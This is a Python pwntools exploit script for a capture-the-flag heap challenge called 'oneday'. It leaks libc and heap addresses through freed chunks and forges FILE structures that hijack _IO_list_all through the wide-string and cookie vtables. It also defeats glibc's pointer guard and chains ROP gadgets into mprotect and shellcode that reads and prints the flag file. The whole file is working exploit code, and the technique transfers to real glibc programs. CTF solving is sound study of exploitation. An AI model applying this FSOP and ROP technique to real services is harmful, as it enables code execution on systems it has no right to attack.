from pwn import *
from pwncli import *
# from struct import pack
# from ctypes import *

# io = remote("127.0.0.1", 55299)
# io = remote("192.168.170.128", 1234)
# io = remote("competition.blue-whale.me", 20631)
# io = remote("182.92.237.102", 10015)
io = process("./oneday")
# io = remote("3.1.2.3", 8888)
# context(os="linux", arch="amd64")
context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./oneday')
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('/home/yukon/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')  # ctfshow用的ubuntu18.04
lg_infos = []
lga = lambda data: lg_infos.append(data)
s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda text, data: io.sendafter(text, data)
sla = lambda text, data: io.sendlineafter(text, data)
r = lambda n: io.recv(n)
ru = lambda text: io.recvuntil(text)
rl = lambda: io.recvline()
uu32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda: int(io.recv(10), 16)
iuu64 = lambda: int(io.recv(6), 16)
uheap = lambda: u64(io.recv(6).ljust(8, b'\x00'))
# lg = lambda addr: log.success(addr)
# lg = lambda addr: log.info(addr)
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(str(data))))
# ia = lambda: io.interactive()

def log_all():
    for lg_info in lg_infos:
        lg(lg_info)


def ia():
    log_all()
    io.interactive()


def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))


def get_IO_str_jumps():
   IO_file_jumps_offset = libc.sym['_IO_file_jumps']
   IO_str_underflow_offset = libc.sym['_IO_str_underflow']
   for ref_offset in libc.search(p64(IO_str_underflow_offset)):
       possible_IO_str_jumps_offset = ref_offset - 0x20
       if possible_IO_str_jumps_offset > IO_file_jumps_offset:
          print(possible_IO_str_jumps_offset)
          return possible_IO_str_jumps_offset


def add(choice):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'1')
    io.recvuntil(b'choise: ')
    io.sendline(str(choice).encode())


def delete(idx):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'2')
    io.recvuntil(b'Index: \n')
    io.sendline(str(idx).encode())


def edit(idx, message):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'3')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Message: \n')
    io.send(message)


def show(idx):
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'4')
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())


def exit():
    io.recvuntil(b'enter your command: \n')
    io.sendline(b'9')


# gdb.attach(io)
# gdb.attach(io, 'b printf')
# gdb.attach(io, 'b *0x4011B4')


sla(b'enter your key >>\n', str(10).encode())
add(2)  # 0
add(2)  # 1
add(1)  # 2
delete(2)
delete(1)
delete(0)

add(1)  # 3
add(1)  # 4
add(1)  # 5
add(1)  # 6
delete(3)
delete(5)
show(3)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1f2cc0
lga("libc_base")
io.recv(2)
heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x17f0
lga("heap_base")
delete(4)
delete(6)
add(3)  # 7
add(1)  # 8
add(1)  # 9
delete(8)
add(3)  # 10
gdb.attach(io, "tele $rebase(0x202040) 0x20\nb exit")

target_addr = libc_base + libc.sym['_IO_list_all']
_IO_wstrn_jumps = libc_base + 0x1f3d20
_IO_cookie_jumps = libc_base + 0x1f3ae0
_lock = libc_base + 0x1f5720
point_guard_addr = libc_base + 0x3c45f0
expected = heap_base + 0x1900
chain = heap_base + 0x1910
magic_gadget = libc_base + 0x146020
mov_rsp_rdx_ret = libc_base + 0x56530
add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
pop_rdi_ret = libc_base + 0x2daa2
pop_rsi_ret = libc_base + 0x37c0a
pop_rdx_rbx_ret = libc_base + 0x87729
lga("target_addr")
lga("_IO_wstrn_jumps")
lga("_IO_cookie_jumps")
lga("_lock")
lga("point_guard_addr")
lga("target_addr")
lga("target_addr")

f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._lock = _lock
f1._mode = 0
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._mode = 0
f2._lock = _lock
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58

data = flat({
    0x8: target_addr - 0x20,
    0x10: {
        0: {
            0: bytes(f1),
            0x100: {
                0: bytes(f2),
                0xe0: [chain + 0x100, rol(magic_gadget ^ expected, 0x11)],
                0x100: [
                    add_rsp_0x20_pop_rbx_ret,
                    chain + 0x100,
                    0,
                    0,
                    mov_rsp_rdx_ret,
                    0,
                    pop_rdi_ret,
                    chain & ~0xfff,
                    pop_rsi_ret,
                    0x4000,
                    pop_rdx_rbx_ret,
                    7, 0,
                    libc_base + libc.sym['mprotect'],
                    chain + 0x200
                ],
                0x200: asm(shellcraft.open('./flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
            }
        },
        0xa80: [0, 0xab1]
    }
})

edit(5, data)
delete(2)
log_all()
add(3)
exit()
ia()
# io\.recvuntil\("(.*?)"\)
# io\.recvuntil\(b"$1"\)
# io\.sendline\(str\((.*?)\)\)
# io\.sendline\(str\($1\)\.encode\(\)\)